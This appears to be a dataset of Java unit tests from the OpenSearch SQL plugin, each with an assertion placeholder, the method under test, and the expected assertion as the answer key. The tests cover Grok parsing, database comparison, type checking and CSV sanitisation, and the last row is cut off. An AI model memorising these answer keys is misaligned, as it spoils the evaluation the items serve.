"Throwable { GrokCompiler compiler = GrokCompiler.newInstance(); compiler.register(Resources.getResource(""patterns/postfix"").openStream()); compiler.register(Resources.getResource(""patterns/patterns"").openStream()); Grok grok = compiler.compile(""%{POSTFIX_SMTPD}"", true);  ""<AssertPlaceHolder>""; }
getPatterns() { return grokPatternDefinition; }"	"assertTrue(grok.getPatterns().containsKey(""POSTFIX_SMTPD""))"
"Throwable { String pattern = ""(?<message>client id): (?<clientid>.*)""; String input = ""client id: ""name"" ""Mac OS X Mail"" ""version"" ""10.2 (3259)"" ""os"" ""Mac OS X"""" + """"os-version"" ""10.12.3 (16D32)"" ""vendor"" ""Apple Inc."""";  // Validate the search is good Pattern javaPattern = Pattern.compile(pattern); Matcher javaMatcher = javaPattern.matcher(input); if (javaMatcher.matches()) { System.out.println(javaMatcher.group(""clientid"")); }  GrokCompiler grokCompiler = GrokCompiler.newInstance(); grokCompiler.registerDefaultPatterns();  org.opensearch.sql.common.grok.Grok grok = grokCompiler.compile(pattern, true);  Match gm = grok.match(input); Map<String, Object> captures = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	"assertEquals(captures.get(""clientid""), gm.getMatch().group(""clientid""))"
"testEmptyLine() { GrokCompiler grokCompiler = GrokCompiler.newInstance(); grokCompiler.registerDefaultPatterns(); final Grok grok = grokCompiler.compile(""%{GREEDYDATA}"");  // empty line String line = ""     ""; Match gm = grok.match(line); Map<String, Object> capture = gm.capture(); ""<AssertPlaceHolder>""; }
match(CharSequence text) { if (compiledNamedRegex == null || text == null) { return Match.EMPTY; }  Matcher matcher = compiledNamedRegex.matcher(text); if (matcher.find()) { return new Match(text, this, matcher, matcher.start(0), matcher.end(0)); }  return Match.EMPTY; }"	assertEquals(1, capture.size())
"testSchedule() { Mockito.when(nodeClient.threadPool()).thenReturn(threadPool);  Mockito.doAnswer( invocation -> { Runnable task = invocation.getArgument(0); task.run(); return null; }) .when(threadPool) .schedule(ArgumentMatchers.any(), ArgumentMatchers.any(), ArgumentMatchers.any()); AtomicBoolean isRun = new AtomicBoolean(false); Scheduler.schedule(nodeClient, () -> isRun.set(true)); Assert.""<AssertPlaceHolder>""; }
schedule(NodeClient client, Runnable task) { ThreadPool threadPool = client.threadPool(); threadPool.schedule(withCurrentContext(task), new TimeValue(0), SQL_WORKER_THREAD_POOL_NAME); }"	assertTrue(isRun.get())
"testSuccess() { when(openSearchConnection.select(anyString())) .thenReturn( new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John""))))); when(otherDbConnection.select(anyString())) .thenReturn( new DBResult( ""Other DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))));  TestReport expected = new TestReport(); expected.addTestCase(new SuccessTestCase(1, ""SELECT * FROM accounts"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testFailureDueToInconsistency() { DBResult openSearchResult = new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))); DBResult otherDbResult = new DBResult( ""Other DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""JOHN"")))); when(openSearchConnection.select(anyString())).thenReturn(openSearchResult); when(otherDbConnection.select(anyString())).thenReturn(otherDbResult);  TestReport expected = new TestReport(); expected.addTestCase( new FailedTestCase( 1, ""SELECT * FROM accounts"", asList(openSearchResult, otherDbResult), """")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testSuccessFinally() { DBConnection anotherDbConnection = mock(DBConnection.class); when(anotherDbConnection.getDatabaseName()).thenReturn(""Another""); correctnessTest = new ComparisonTest( openSearchConnection, new DBConnection[] {otherDbConnection, anotherDbConnection});  DBResult openSearchResult = new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))); DBResult otherDbResult = new DBResult( ""Other DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""JOHN"")))); DBResult anotherDbResult = new DBResult( ""Another DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))); when(openSearchConnection.select(anyString())).thenReturn(openSearchResult); when(anotherDbConnection.select(anyString())).thenReturn(anotherDbResult);  TestReport expected = new TestReport(); expected.addTestCase(new SuccessTestCase(1, ""SELECT * FROM accounts"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testFailureDueToEventualInconsistency() { DBConnection anotherDbConnection = mock(DBConnection.class); when(anotherDbConnection.getDatabaseName()) .thenReturn(""ZZZ DB""); // Make sure this will be called after Other DB correctnessTest = new ComparisonTest( openSearchConnection, new DBConnection[] {otherDbConnection, anotherDbConnection});  DBResult openSearchResult = new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))); DBResult otherDbResult = new DBResult( ""Other DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""JOHN"")))); DBResult anotherDbResult = new DBResult( ""ZZZ DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""Hank"")))); when(openSearchConnection.select(anyString())).thenReturn(openSearchResult); when(otherDbConnection.select(anyString())).thenReturn(otherDbResult); when(anotherDbConnection.select(anyString())).thenReturn(anotherDbResult);  TestReport expected = new TestReport(); expected.addTestCase( new FailedTestCase( 1, ""SELECT * FROM accounts"", asList(openSearchResult, otherDbResult, anotherDbResult), """")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testErrorDueToESException() { when(openSearchConnection.select(anyString())) .thenThrow(new RuntimeException(""All shards failure""));  TestReport expected = new TestReport(); expected.addTestCase( new ErrorTestCase(1, ""SELECT * FROM accounts"", ""RuntimeException: All shards failure"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testErrorDueToNoOtherDBSupportThisQuery() { when(openSearchConnection.select(anyString())) .thenReturn( new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John""))))); when(otherDbConnection.select(anyString())) .thenThrow(new RuntimeException(""Unsupported feature""));  TestReport expected = new TestReport(); expected.addTestCase( new ErrorTestCase( 1, ""SELECT * FROM accounts"", ""No other databases support this query: Unsupported feature;"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testSuccessWhenOneDBSupportThisQuery() { DBConnection anotherDbConnection = mock(DBConnection.class); when(anotherDbConnection.getDatabaseName()).thenReturn(""Another""); correctnessTest = new ComparisonTest( openSearchConnection, new DBConnection[] {otherDbConnection, anotherDbConnection});  when(openSearchConnection.select(anyString())) .thenReturn( new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John""))))); when(anotherDbConnection.select(anyString())) .thenReturn( new DBResult( ""Another DB"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))));  TestReport expected = new TestReport(); expected.addTestCase(new SuccessTestCase(1, ""SELECT * FROM accounts"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"testFailureDueToInconsistencyAndExceptionMixed() { DBConnection otherDBConnection2 = mock(DBConnection.class); when(otherDBConnection2.getDatabaseName()).thenReturn(""ZZZ DB""); correctnessTest = new ComparisonTest( openSearchConnection, new DBConnection[] {otherDbConnection, otherDBConnection2});  DBResult openSearchResult = new DBResult( ""OpenSearch"", asList(new Type(""firstname"", ""text"")), asList(new Row(asList(""John"")))); DBResult otherResult = new DBResult(""Other"", asList(new Type(""firstname"", ""text"")), Collections.emptyList());  when(openSearchConnection.select(anyString())).thenReturn(openSearchResult); when(otherDbConnection.select(anyString())).thenReturn(otherResult); when(otherDBConnection2.select(anyString())) .thenThrow(new RuntimeException(""Unsupported feature""));  TestReport expected = new TestReport(); expected.addTestCase( new FailedTestCase( 1, ""SELECT * FROM accounts"", asList(openSearchResult, otherResult), ""Unsupported feature;"")); TestReport actual = correctnessTest.verify(querySet(""SELECT * FROM accounts"")); ""<AssertPlaceHolder>""; }
verify(TestQuerySet querySet) { TestReport report = new TestReport(); for (String sql : querySet) { try { DBResult openSearchResult = thisConnection.select(sql); report.addTestCase(compareWithOtherDb(sql, openSearchResult)); } catch (Exception e) { report.addTestCase( new ErrorTestCase( nextId(), sql, StringUtils.format(""%s: %s"", e.getClass().getSimpleName(), extractRootCause(e)))); } } return report; }"	assertEquals(expected, actual)
"dbResultWithSameRowsInDifferentOrderShouldEqual() { DBResult result1 = DBResult.result(""DB 1""); result1.addColumn(""name"", ""VARCHAR""); result1.addRow(new Row(ImmutableList.of(""test-1""))); result1.addRow(new Row(ImmutableList.of(""test-2"")));  DBResult result2 = DBResult.result(""DB 2""); result2.addColumn(""name"", ""VARCHAR""); result2.addRow(new Row(ImmutableList.of(""test-2""))); result2.addRow(new Row(ImmutableList.of(""test-1"")));  ""<AssertPlaceHolder>""; }
addRow(Row row) { dataRows.add(row); }"	assertEquals(result1, result2)
"shouldExplainColumnTypeDifference() { DBResult result1 = new DBResult( ""DB 1"", Arrays.asList(new Type(""name"", ""VARCHAR""), new Type(""age"", ""FLOAT"")), emptyList()); DBResult result2 = new DBResult( ""DB 2"", Arrays.asList(new Type(""name"", ""VARCHAR""), new Type(""age"", ""INT"")), emptyList());  ""<AssertPlaceHolder>""; }
diff(DBResult other) { String result = diffSchema(other); if (result.isEmpty()) { return diffDataRows(other); } return result; }"	"assertEquals( ""Schema type at [1] is different: "" + ""this=[Type(name=age, type=FLOAT)], other=[Type(name=age, type=INT)]"", result1.diff(result2))"
"shouldExplainDataRowsDifference() { DBResult result1 = new DBResult( ""DB 1"", Arrays.asList(new Type(""name"", ""VARCHAR"")), Sets.newHashSet( new Row(Arrays.asList(""hello"")), new Row(Arrays.asList(""world"")), new Row(Lists.newArrayList((Object) null)))); DBResult result2 = new DBResult( ""DB 2"", Arrays.asList(new Type(""name"", ""VARCHAR"")), Sets.newHashSet( new Row(Lists.newArrayList((Object) null)), new Row(Arrays.asList(""hello"")), new Row(Arrays.asList(""world123""))));  ""<AssertPlaceHolder>""; }
diff(DBResult other) { String result = diffSchema(other); if (result.isEmpty()) { return diffDataRows(other); } return result; }"	"assertEquals( ""Data row at [1] is different: this=[Row(values=[world])], other=[Row(values=[world123])]"", result1.diff(result2))"
"shouldExplainDataRowsOrderDifference() { DBResult result1 = DBResult.resultInOrder(""DB 1""); result1.addColumn(""name"", ""VARCHAR""); result1.addRow(new Row(ImmutableList.of(""hello""))); result1.addRow(new Row(ImmutableList.of(""world"")));  DBResult result2 = DBResult.resultInOrder(""DB 2""); result2.addColumn(""name"", ""VARCHAR""); result2.addRow(new Row(ImmutableList.of(""world""))); result2.addRow(new Row(ImmutableList.of(""hello"")));  ""<AssertPlaceHolder>""; }
diff(DBResult other) { String result = diffSchema(other); if (result.isEmpty()) { return diffDataRows(other); } return result; }"	"assertEquals( ""Data row at [0] is different: this=[Row(values=[hello])], other=[Row(values=[world])]"", result1.diff(result2))"
"SQLException { conn.drop(""test"");  ArgumentCaptor<String> argCap = ArgumentCaptor.forClass(String.class); verify(statement).executeUpdate(argCap.capture()); String actual = argCap.getValue();  ""<AssertPlaceHolder>""; }
drop(String tableName) { try (Statement stmt = connection.createStatement()) { stmt.executeUpdate(""DROP TABLE "" + tableName); } catch (SQLException e) { throw new IllegalStateException(""Failed to drop table ["" + tableName + ""]"", e); } }"	"assertEquals(""DROP TABLE test"", actual)"
"SQLException { ResultSetMetaData metaData = mockMetaData(ImmutableMap.of(""name"", ""VARCHAR"", ""age"", ""INT""), ""n"", ""a""); ResultSet resultSet = mockResultSet(new Object[] {""John"", 25}, new Object[] {""Hank"", 30}); when(statement.executeQuery(anyString())).thenReturn(resultSet); when(resultSet.getMetaData()).thenReturn(metaData);  DBResult result = conn.select(""SELECT * FROM test""); ""<AssertPlaceHolder>""; }
select(String query) { try (Statement stmt = connection.createStatement()) { ResultSet resultSet = stmt.executeQuery(query); DBResult result = isOrderByQuery(query) ? DBResult.resultInOrder(databaseName) : DBResult.result(databaseName); populateMetaData(resultSet, result); populateData(resultSet, result); return result; } catch (SQLException e) { throw new IllegalStateException(""Failed to execute query ["" + query + ""]"", e); } }"	"assertEquals(Arrays.asList(new Type(""N"", ""VARCHAR""), new Type(""A"", ""INT"")), result.getSchema())"
"defineFieldSymbolInDifferentEnvironmentsShouldBeAbleToResolveByPrefix() { // Root environment Symbol birthday = new Symbol(Namespace.FIELD_NAME, ""s.birthday""); environment().define(birthday, DATE);  // New environment 1 context.push(); Symbol city = new Symbol(Namespace.FIELD_NAME, ""s.city""); environment().define(city, KEYWORD);  // New environment 2 context.push(); Symbol manager = new Symbol(Namespace.FIELD_NAME, ""s.manager""); environment().define(manager, OBJECT);  Map<String, Type> typeByName = environment().resolveByPrefix(new Symbol(Namespace.FIELD_NAME, ""s"")); ""<AssertPlaceHolder>""; }
define(Symbol symbol, Type type) { symbolTable.store(symbol, type); }"	"assertThat( typeByName, allOf( aMapWithSize(3), hasEntry(""s.birthday"", DATE), hasEntry(""s.city"", KEYWORD), hasEntry(""s.manager"", OBJECT)))"
"defineFieldSymbolShouldBeAbleToResolveAll() { environment() .define( new Symbol(Namespace.FIELD_NAME, ""s.projects""), new OpenSearchIndex(""s.projects"", NESTED_FIELD)); environment().define(new Symbol(Namespace.FIELD_NAME, ""s.projects.release""), DATE); environment().define(new Symbol(Namespace.FIELD_NAME, ""s.projects.active""), BOOLEAN); environment().define(new Symbol(Namespace.FIELD_NAME, ""s.address""), TEXT); environment().define(new Symbol(Namespace.FIELD_NAME, ""s.city""), KEYWORD); environment().define(new Symbol(Namespace.FIELD_NAME, ""s.manager.name""), TEXT);  Map<String, Type> typeByName = environment().resolveAll(Namespace.FIELD_NAME); ""<AssertPlaceHolder>""; }
resolveAll(Namespace namespace) { Map<String, Type> result = new HashMap<>(); for (Environment cur = this; cur != null; cur = cur.parent) { // putIfAbsent ensures inner most definition will be used (shadow outers) cur.symbolTable.lookupAll(namespace).forEach(result::putIfAbsent); } return result; }"	"assertThat( typeByName, allOf( aMapWithSize(6), hasEntry(""s.projects"", (Type) new OpenSearchIndex(""s.projects"", NESTED_FIELD)), hasEntry(""s.projects.release"", DATE), hasEntry(""s.projects.active"", BOOLEAN), hasEntry(""s.address"", TEXT), hasEntry(""s.city"", KEYWORD), hasEntry(""s.manager.name"", TEXT)))"
"defineFieldSymbolInDifferentEnvironmentsShouldBeAbleToResolveAll() { // Root environment Symbol birthday = new Symbol(Namespace.FIELD_NAME, ""s.birthday""); environment().define(birthday, DATE);  // New environment 1 context.push(); Symbol city = new Symbol(Namespace.FIELD_NAME, ""s.city""); environment().define(city, KEYWORD);  // New environment 2 context.push(); Symbol manager = new Symbol(Namespace.FIELD_NAME, ""s.manager""); environment().define(manager, OBJECT);  Map<String, Type> typeByName = environment().resolveAll(Namespace.FIELD_NAME); ""<AssertPlaceHolder>""; }
resolveAll(Namespace namespace) { Map<String, Type> result = new HashMap<>(); for (Environment cur = this; cur != null; cur = cur.parent) { // putIfAbsent ensures inner most definition will be used (shadow outers) cur.symbolTable.lookupAll(namespace).forEach(result::putIfAbsent); } return result; }"	"assertThat( typeByName, allOf( aMapWithSize(3), hasEntry(""s.birthday"", DATE), hasEntry(""s.city"", KEYWORD), hasEntry(""s.manager"", OBJECT)))"
"rootEnvironmentShouldBeThereInitially() { Assert.""<AssertPlaceHolder>""; }
peek() { return environment; }"	"assertNotNull( ""Didn't find root environment. Context is NOT supposed to be empty initially"", context.peek())"
"haveOneTypeShouldPass() { TypeSupplier age = new TypeSupplier(""age"", OpenSearchDataType.INTEGER);  ""<AssertPlaceHolder>""; }
get() { if (types.size() > 1) { throw new SemanticAnalysisException( String.format(""Field [%s] have conflict type [%s]"", symbolName, types)); } else { return symbolType; } }"	assertEquals(OpenSearchDataType.INTEGER, age.get())
"addSameTypeShouldPass() { TypeSupplier age = new TypeSupplier(""age"", OpenSearchDataType.INTEGER); age.add(OpenSearchDataType.INTEGER);  ""<AssertPlaceHolder>""; }
get() { if (types.size() > 1) { throw new SemanticAnalysisException( String.format(""Field [%s] have conflict type [%s]"", symbolName, types)); } else { return symbolType; } }"	assertEquals(OpenSearchDataType.INTEGER, age.get())
"compatibilityCheckShouldFailIfNoSpecificationCompatible() { ""<AssertPlaceHolder>""; }
construct(List<Type> actualArgs) { TypeExpressionSpec[] specifications = specifications(); if (specifications.length == 0) { // Empty spec means type check for this type expression is not implemented yet. // Return this to be compatible with everything. return UNKNOWN; }  // Create a temp specification for compatibility check. TypeExpressionSpec actualSpec = new TypeExpressionSpec(); actualSpec.argTypes = actualArgs.toArray(new Type[0]);  // Perform compatibility check between actual spec (argument types) and expected. // If found any compatible spec, it means actual spec is legal and thus apply to get result // type. // Ex. Actual=[INTEGER], Specs=[NUMBER->NUMBER], [STRING->NUMBER]. So first spec matches and // return NUMBER. for (TypeExpressionSpec spec : specifications) { if (spec.isCompatible(actualSpec)) { return spec.constructFunc.apply(actualArgs.toArray(new Type[0])); } } return TYPE_ERROR; }"	assertEquals(TYPE_ERROR, test123.construct(Arrays.asList(BOOLEAN)))
"usageShouldPrintAllSpecifications() { ""<AssertPlaceHolder>""; }
usage() { return Arrays.stream(specifications()) .map(spec -> getName() + spec) .collect(Collectors.joining("" or "")); }"	"assertEquals(""TEST123(NUMBER T) -> T or TEST123(STRING, BOOLEAN) -> DATE"", test123.usage())"
"flatFieldMappingsShouldIncludeFieldsOnAllLevels() { IndexMappings indexMappings = LocalClusterState.state().getFieldMappings(new String[] {""field_mappings""}); FieldMappings fieldMappings = indexMappings.firstMapping();  Map<String, String> typeByFieldName = new HashMap<>(); fieldMappings.flat(typeByFieldName::put); ""<AssertPlaceHolder>""; }
flat(BiConsumer<String, String> func) { flatMappings(data(), Optional.empty(), func); }"	"assertThat( typeByFieldName, allOf( aMapWithSize(13), hasEntry(""address"", ""text""), hasEntry(""age"", ""integer""), hasEntry(""employer"", ""text""), hasEntry(""employer.raw"", ""text""), hasEntry(""employer.keyword"", ""keyword""), hasEntry(""projects"", ""nested""), hasEntry(""projects.active"", ""boolean""), hasEntry(""projects.members"", ""nested""), hasEntry(""projects.members.name"", ""text""), hasEntry(""manager"", ""object""), hasEntry(""manager.name"", ""text""), hasEntry(""manager.name.keyword"", ""keyword""), hasEntry(""manager.address"", ""keyword"")))"
"getHeadersShouldReturnHeadersSanitized() { CSVResult csv = csv(headers(""name"", ""=age""), lines(line(""John"", ""30""))); ""<AssertPlaceHolder>""; }
getHeaders() { return headers; }"	"assertEquals(headers(""name"", ""'=age""), csv.getHeaders())"
"getLinesShouldReturnLinesSanitized() { CSVResult csv = csv( headers(""name"", ""city""), lines( line(""John"", ""Seattle""), line(""John"", ""=Seattle""), line(""John"", ""+Seattle""), line(""-John"", ""Seattle""), line(""@John"", ""Seattle""), line(""John"", ""Seattle="")));  ""<AssertPlaceHolder>""; }
getLines() { return lines; }"	"assertEquals( line( ""John,Seattle"", ""John,'=Seattle"", ""John,'+Seattle"", ""'-John,Seattle"", ""'@John,Seattle"", ""John,Seattle=""), csv.getLines())"
"getHeadersShouldReturnHeadersQuotedIfRequired() { CSVResult csv = csv(headers(""na,me"", "",,age""), lines(line(""John"", ""30""))); ""<AssertPlaceHolder>""; }
getHeaders() { return headers; }"	"assertEquals(headers(""""na,me"""", """",,age""""), csv.getHeaders())"
"getLinesShouldReturnLinesQuotedIfRequired() { CSVResult csv = csv(headers(""name"", ""age""), lines(line(""John,Smith"", ""30,,,""))); ""<AssertPlaceHolder>""; }
getLines() { return lines; }"	"assertEquals(line(""""John,Smith"",""30,,,""""), csv.getLines())"
"getHeadersShouldReturnHeadersBothSanitizedAndQuotedIfRequired() { CSVResult csv = csv(headers(""na,+me"", "",,,=age"", ""=city,""), lines(line(""John"", ""30"", ""Seattle""))); ""<AssertPlaceHolder>""; }
getHeaders() { return headers; }"	"assertEquals(headers(""""na,+me"""", """",,,=age"""", """"'=city,""""), csv.getHeaders())"
"getLinesShouldReturnLinesBothSanitizedAndQuotedIfRequired() { CSVResult csv = csv( headers(""name"", ""city""), lines( line(""John"", ""Seattle""), line(""John"", ""=Seattle""), line(""John"", ""+Sea,ttle""), line("",-John"", ""Seattle""), line("",,,@John"", ""Seattle""), line(""John"", ""Seattle="")));  ""<AssertPlaceHolder>""; }
getLines() { return lines; }"	"assertEquals( line( ""John,Seattle"", ""John,'=Seattle"", ""John,""'+Sea,ttle"""", """",-John"",Seattle"", """",,,@John"",Seattle"", ""John,Seattle=""), csv.getLines())"
"testCreate() { when(LocalClusterState.state().getSettingValue(SQL_CURSOR_KEEP_ALIVE)) .thenReturn(new TimeValue(10000));  CreatePitResponse mockCreatePitResponse = mock(CreatePitResponse.class); when(mockCreatePitResponse.getId()).thenReturn(PIT_ID);  CompletableFuture<CreatePitResponse> completableFuture = CompletableFuture.completedFuture(mockCreatePitResponse);  doAnswer( invocation -> { ActionListener<CreatePitResponse> actionListener = invocation.getArgument(1); actionListener.onResponse(mockCreatePitResponse); return completableFuture; }) .when(mockClient) .createPit(any(), any());  pointInTimeHandlerImpl.create();  ""<AssertPlaceHolder>""; }
create() { CreatePitRequest createPitRequest = new CreatePitRequest( LocalClusterState.state().getSettingValue(SQL_CURSOR_KEEP_ALIVE), false, indices); client.createPit( createPitRequest, new ActionListener<>() { @Override public void onResponse(CreatePitResponse createPitResponse) { pitId = createPitResponse.getId(); LOG.info(""Created Point In Time {} successfully."", pitId); }  @Override public void onFailure(Exception e) { LOG.error(""Error occurred while creating PIT"", e); } }); }"	assertEquals(PIT_ID, pointInTimeHandlerImpl.getPitId())
"testRetainWithObjectField() { SearchHit hit = new SearchHit(1); hit.sourceRef(new BytesArray(""{""a.id"": {""serial"": 3}}"")); SearchHitRow row = new SearchHitRow(hit, """"); row.retain(ImmutableMap.of(""a.id.serial"", """"));  SearchHit expected = new SearchHit(1); expected.sourceRef(new BytesArray(""{""a.id"": {""serial"": 3}}"")); ""<AssertPlaceHolder>""; }
data() { return hit; }"	assertEquals(expected, row.data())
"testRetainWithUnexpandedObjectField() { SearchHit hit = new SearchHit(1); hit.sourceRef(new BytesArray(""{""a.attributes.hardware.correlate_id"": 10}"")); SearchHitRow row = new SearchHitRow(hit, """"); row.retain(ImmutableMap.of(""a.attributes.hardware.correlate_id"", """"));  SearchHit expected = new SearchHit(1); expected.sourceRef(new BytesArray(""{""a.attributes.hardware.correlate_id"": 10}"")); ""<AssertPlaceHolder>""; }
data() { return hit; }"	assertEquals(expected, row.data())
"identifierWithWordBeforeFirstDotShouldBeConsideredHavePrefix() { Assert.""<AssertPlaceHolder>""; }
hasPrefix() { return firstDotIndex() != -1; }"	"assertTrue(identifier(""accounts.age"").hasPrefix())"
"identifierWithoutDotShouldNotBeConsideredHavePrefix() { Assert.""<AssertPlaceHolder>""; }
hasPrefix() { return firstDotIndex() != -1; }"	"assertFalse(identifier(""age"").hasPrefix())"
"identifierStartingWithDotShouldNotBeConsideredHavePrefix() { Assert.""<AssertPlaceHolder>""; }
hasPrefix() { return firstDotIndex() != -1; }"	"assertFalse(identifier("".age"").hasPrefix())"
"prefixOfIdentifierShouldBeWordBeforeFirstDot() { Assert.""<AssertPlaceHolder>""; }
prefix() { return name().substring(0, firstDotIndex()); }"	"assertEquals(""accounts"", identifier(""accounts.age"").prefix())"
"identifierOfTableNameShouldReturnTheTableName() { Table table = new Table(new SQLExprTableSource(new SQLIdentifierExpr(""accounts""))); Assert.""<AssertPlaceHolder>""; }
name() { SQLExpr expr = tableExpr.getExpr(); if (expr instanceof SQLIdentifierExpr) { return ((SQLIdentifierExpr) expr).getName(); } else if (isTableWithType(expr)) { return ((SQLIdentifierExpr) ((SQLBinaryOpExpr) expr).getLeft()).getName(); } return expr.toString(); }"	"assertEquals(""accounts"", table.name())"
"identifierOfTableAndTypeNameShouldReturnTheTableNameOnly() { Table table = new Table( new SQLExprTableSource( new SQLBinaryOpExpr( new SQLIdentifierExpr(""accounts""), SQLBinaryOperator.Divide, new SQLIdentifierExpr(""test"")))); Assert.""<AssertPlaceHolder>""; }
name() { SQLExpr expr = tableExpr.getExpr(); if (expr instanceof SQLIdentifierExpr) { return ((SQLIdentifierExpr) expr).getName(); } else if (isTableWithType(expr)) { return ((SQLIdentifierExpr) ((SQLBinaryOpExpr) expr).getLeft()).getName(); } return expr.toString(); }"	"assertEquals(""accounts"", table.name())"
"getDefaultValueForQuerySlowLog() { when(clusterSettings.get(ClusterName.CLUSTER_NAME_SETTING)).thenReturn(ClusterName.DEFAULT); OpenSearchSettings settings = new OpenSearchSettings(clusterSettings); ""<AssertPlaceHolder>""; }
getSettingValue(Settings.Key key) { Objects.requireNonNull(pluginSettings, ""SQL plugin setting is null""); return (T) latestSettings.getOrDefault(key.getKeyValue(), pluginSettings.getSettingValue(key)); }"	assertEquals(Integer.valueOf(2), settings.getSettingValue(Settings.Key.SQL_SLOWLOG))
"testSubstitute() { String sqlTemplate = ""select * from table_name where number_param > ? and string_param = 'Amazon.com' and"" + "" test_str = '''test escape? \'' and state in (?,?) and null_param = ? and"" + "" double_param = ? and question_mark = '?'""; List<PreparedStatementRequest.PreparedStatementParameter> params = new ArrayList<>(); params.add(new PreparedStatementRequest.PreparedStatementParameter<Integer>(10)); params.add(new PreparedStatementRequest.StringParameter(""WA"")); params.add(new PreparedStatementRequest.StringParameter("""")); params.add(new PreparedStatementRequest.NullParameter()); params.add(new PreparedStatementRequest.PreparedStatementParameter<Double>(2.0)); PreparedStatementRequest psr = new PreparedStatementRequest(sqlTemplate, new JSONObject(), params); String generatedSql = psr.getSql();  String expectedSql = ""select * from table_name where number_param > 10 and string_param = 'Amazon.com' "" + ""and test_str = '''test escape? \'' and state in ('WA','') and null_param = null "" + ""and double_param = 2.0 and question_mark = '?'""; Assert.""<AssertPlaceHolder>""; }
getSql() { return this.sql; }"	assertEquals(expectedSql, generatedSql)
"testSubstitute_nullSql() { PreparedStatementRequest psr = new PreparedStatementRequest(null, new JSONObject(), null);  Assert.""<AssertPlaceHolder>""; }
getSql() { return this.sql; }"	assertNull(psr.getSql())
"shouldReturnFalseIfNoPrettyParams() { ""<AssertPlaceHolder>""; }
isPrettyFormat(Map<String, String> requestParams) { return requestParams.containsKey(QUERY_PARAMS_PRETTY) && ("""".equals(requestParams.get(QUERY_PARAMS_PRETTY)) || ""true"".equals(requestParams.get(QUERY_PARAMS_PRETTY))); }"	assertFalse(SqlRequestParam.isPrettyFormat(ImmutableMap.of()))
"shouldReturnDefaultFormatIfNoFormatParams() { ""<AssertPlaceHolder>""; }
